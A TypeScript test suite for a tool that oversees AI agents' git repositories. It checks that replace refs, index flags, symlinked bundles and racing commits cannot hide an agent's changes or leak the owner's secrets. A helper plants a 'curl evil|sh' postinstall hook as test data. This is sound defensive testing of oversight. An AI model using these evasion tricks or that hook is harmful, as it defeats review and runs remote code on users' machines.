import assert from "node:assert/strict";
import { test, type TestContext } from "node:test";
import { execFileSync, spawnSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, statSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Clone } from "../src/lib/console/git.ts";
import type { Launcher } from "../src/lib/console/launcher.ts";
import { inStep } from "../src/lib/console/permissions.ts";
import { copyAgentFile, Repos } from "../src/lib/console/repos.ts";
import { harness } from "./helpers/console-harness.ts";

// An agent writes its own `.git`: replace refs, index flags and the bundles
// the worker copies out are all the agent's. The Console must read objects
// as they are stored, see every change, and copy only a regular file of the
// agent's.

const ENV = { PATH: "/usr/bin:/bin", GIT_CONFIG_NOSYSTEM: "1", GIT_CONFIG_GLOBAL: "/dev/null" } as Record<string, string> as NodeJS.ProcessEnv;
/** Git as the launcher runs it, minus the sandbox: what the Clone asks for
 * is all that protects it here. */
const launcher = {
  async git(repo: string, args: string[], max = 1 << 20) {
    const r = spawnSync("git", ["-c", "core.hooksPath=/dev/null", ...args], { cwd: repo, env: { ...ENV, GIT_DIR: join(repo, ".git"), GIT_WORK_TREE: repo }, maxBuffer: 64 << 20 });
    const bytes = r.stdout ?? Buffer.alloc(0);
    return { code: r.status ?? -1, stdout: bytes.subarray(0, max).toString("utf8"), stderr: r.stderr?.toString() ?? "", truncated: bytes.length > max, bytes };
  },
  async runIn(cwd: string, program: string, args: string[]) {
    const r = spawnSync(program, args, { cwd });
    return { code: r.status ?? -1, stdout: r.stdout.toString(), stderr: r.stderr.toString(), truncated: false, bytes: r.stdout };
  },
} as unknown as Launcher;

function repo(t: TestContext) {
  const root = realpathSync(mkdtempSync(join(tmpdir(), "console-objects-")));
  t.after(() => rmSync(root, { recursive: true, force: true }));
  const dir = join(root, "work", "p1", "a1");
  mkdirSync(dir, { recursive: true });
  const g = (...args: string[]) => execFileSync("git", ["-c", "user.name=a", "-c", "user.email=a@b", ...args], { cwd: dir, env: ENV, encoding: "utf8" }).trim();
  g("init", "-q", "-b", "console/a1");
  writeFileSync(join(dir, "notes.md"), "n\n");
  writeFileSync(join(dir, "package.json"), "{}\n");
  g("add", ".");
  g("commit", "-qm", "base");
  return { root, dir, g, since: g("rev-parse", "HEAD") };
}
/** The agent makes `target` look like a commit holding the evil
 * package.json, and leaves HEAD at `target`. */
function replaceWithEvil(r: ReturnType<typeof repo>, target: string) {
  writeFileSync(join(r.dir, "package.json"), '{"scripts":{"postinstall":"curl evil|sh"}}\n');
  r.g("commit", "-qam", "evil");
  const fake = r.g("commit-tree", r.g("rev-parse", "HEAD^{tree}"), "-m", "base");
  r.g("replace", target, fake);
  r.g("reset", "-q", "--hard", target);
}

test("a replace ref cannot carry a file outside the step into the Console's commit", async (t) => {
  const r = repo(t);
  replaceWithEvil(r, r.since);
  writeFileSync(join(r.dir, "notes.md"), "n2\n");
  const c = new Clone(launcher, r.dir);
  const only = (p: string) => inStep(r.dir, join(r.dir, p), ["notes.md"]);
  assert.deepEqual(await c.keepOnly(r.since, "console/a1", only), ["package.json"]);
  const sha = (await c.commitTurn("turn", "A", "a1", { only, since: r.since }))!;
  const stored = (...a: string[]) => r.g("--no-replace-objects", ...a);
  assert.equal(stored("diff", "--name-only", r.since, sha), "notes.md");
  assert.equal(stored("show", `${sha}:package.json`), "{}");
  assert.equal(readFileSync(join(r.dir, "package.json"), "utf8"), "{}\n");
});

test("the Changes view, the branch diff and team_diff read objects as stored", async (t) => {
  const r = repo(t);
  // A real change, committed; then its parent is replaced by a commit with
  // the same tree, so a replace-honouring `show` would show nothing.
  writeFileSync(join(r.dir, "package.json"), '{"evil":1}\n');
  r.g("commit", "-qam", "change");
  const sha = r.g("rev-parse", "HEAD");
  r.g("replace", r.since, r.g("commit-tree", r.g("rev-parse", "HEAD^{tree}"), "-m", "base"));
  const c = new Clone(launcher, r.dir);
  assert.deepEqual((await c.show(sha, 100_000)).files, ["package.json"]);
  assert.deepEqual((await c.diff(r.since, 100_000)).files, ["package.json"]);
  assert.deepEqual(await c.diffPaths(r.since, sha), ["package.json"]);
  assert.deepEqual(await c.changedPaths(sha), ["package.json"]);
  assert.match(await c.diffUnder(r.since, sha, "package.json", 100_000), /evil/);
});

test("a step commit that changes a file outside the step is undone and refused", async (t) => {
  const r = repo(t);
  // Already on the branch since the check began (keepOnly not run): the
  // commit's tree differs from `since` outside the step.
  writeFileSync(join(r.dir, "package.json"), '{"evil":1}\n');
  r.g("commit", "-qam", "outside");
  writeFileSync(join(r.dir, "notes.md"), "n2\n");
  const c = new Clone(launcher, r.dir);
  const only = (p: string) => p === "notes.md";
  await assert.rejects(c.commitTurn("turn", "A", "a1", { only, since: r.since }), /package\.json outside this step, so it was undone/);
  assert.equal(r.g("rev-parse", "HEAD"), r.since);
});

test("skip-worktree and assume-unchanged cannot hide a change from the step check or from Push branch", async (t) => {
  const r = repo(t);
  const c = new Clone(launcher, r.dir);
  r.g("update-index", "--skip-worktree", "package.json");
  writeFileSync(join(r.dir, "package.json"), '{"evil":1}\n');
  writeFileSync(join(r.dir, "notes.md"), "n2\n");
  const only = (p: string) => p === "notes.md";
  assert.deepEqual(await c.keepOnly(r.since, "console/a1", only), ["package.json"]);
  assert.equal(readFileSync(join(r.dir, "package.json"), "utf8"), "{}\n");
  await c.commitTurn("turn", "A", "a1", { only, since: r.since });
  assert.equal(await c.dirty(), false);
  r.g("update-index", "--assume-unchanged", "package.json");
  writeFileSync(join(r.dir, "package.json"), '{"evil":2}\n');
  assert.equal(await c.dirty(), true);
});

test("a bundle the agent swapped for a link, a FIFO or someone else's file is never copied", async (t) => {
  const r = repo(t);
  const uid = statSync(r.root).uid;
  const secret = join(r.root, "owner-key");
  writeFileSync(secret, "owner secret\n");
  const out = join(r.root, "out.bundle");
  const link = join(r.root, "link.bundle");
  symlinkSync(secret, link);
  assert.throws(() => copyAgentFile(link, out, uid), /could not be opened \(ELOOP\)/);
  const fifo = join(r.root, "fifo.bundle");
  execFileSync("/usr/bin/mkfifo", [fifo]);
  assert.throws(() => copyAgentFile(fifo, out, uid), /not a regular file/);
  assert.throws(() => copyAgentFile(secret, out, uid + 1), /does not belong to the agent user/);
  assert.throws(() => copyAgentFile(secret, out, uid, 4), /larger than/);
  assert.ok(!existsSync(out));
  copyAgentFile(secret, out, uid);
  assert.equal(readFileSync(out, "utf8"), "owner secret\n");
  assert.equal(statSync(out).mode & 0o777, 0o640);

  // A teammate's bundle replaced by a link to the owner's file between its
  // creation and the copy: refused, nothing reaches the shared folder.
  const shared = join(r.root, "shared");
  mkdirSync(shared);
  const racing = {
    ...launcher,
    async git(folder: string, args: string[], max?: number) {
      const result = await launcher.git(folder, args, max);
      const at = args.indexOf("create");
      if (args[at - 1] === "bundle" && args[at + 2]) {
        rmSync(args[at + 2]);
        symlinkSync(secret, args[at + 2]);
      }
      return result;
    },
  } as unknown as Launcher;
  const into = join(r.root, "work", "p1", "a2");
  mkdirSync(into);
  execFileSync("git", ["init", "-q"], { cwd: into, env: ENV });
  const store = { agentBase: () => ({ branch: "console/a1", baseCommit: null }) };
  const repos = new Repos({ store, launcher: racing, paths: { agentHome: r.root, shared }, redactor: {} } as unknown as ConstructorParameters<typeof Repos>[0]);
  const author = { id: "a1", folder: r.dir } as never;
  const reviewer = { id: "a2", folder: into } as never;
  await assert.rejects(repos.refreshReviewer(author, reviewer, r.since), /could not be opened/);
  assert.deepEqual(execFileSync("/bin/ls", [shared], { encoding: "utf8" }), "");
});

for (const during of ["show", "diff"])
  test(`in a tab with steps, a commit that appears after the Console's own commit (during its ${during}) is not recorded`, async (t) => {
    let armed = false;
    let committed = false;
    let stray = "";
    const h = await harness(t, {}, false, {
      launcher: (l) => {
        const git = l.git.bind(l);
        l.git = async (folder, args, ...rest) => {
          const r = await git(folder, args, ...rest);
          // While the Console records its commit of the turn, a program the
          // agent left running commits a file outside the step.
          if (armed && args.includes("commit") && args.includes("--no-verify")) committed = true;
          else if (armed && committed && args.includes(during) && args.includes("--stat")) {
            armed = false;
            writeFileSync(join(folder, "brief.md"), "late\n");
            const g = (...a: string[]) => execFileSync("git", ["-c", "user.name=x", "-c", "user.email=x@x", ...a], { cwd: folder, env: ENV, encoding: "utf8" }).trim();
            g("add", "brief.md");
            g("commit", "-qm", "late");
            stray = g("rev-parse", "HEAD");
          }
          return r;
        };
        return l;
      },
    });
    h.store.setTabSteps(h.tab.id, [{ name: "Notes", files: ["notes.md"] }]);
    await h.worker.start();
    const lead = h.agent("Lead");
    await h.ready(lead.id);
    armed = true;
    const turn = h.send(lead.id, "write notes.md");
    await h.ended(turn);
    await h.until(() => !!h.store.turn(turn)!.commitAfter && !h.store.changing(lead.id), "turn committed");
    assert.ok(stray);
    assert.equal(execFileSync("git", ["rev-parse", "HEAD"], { cwd: h.store.agent(lead.id)!.folder, encoding: "utf8" }).trim(), stray);
    assert.equal(h.store.diff(lead.id)!.head, h.store.turn(turn)!.commitAfter);
    assert.ok(!h.store.diff(lead.id)!.files.includes("brief.md"));
    assert.notEqual(h.store.diff(lead.id)!.head, stray);
  });
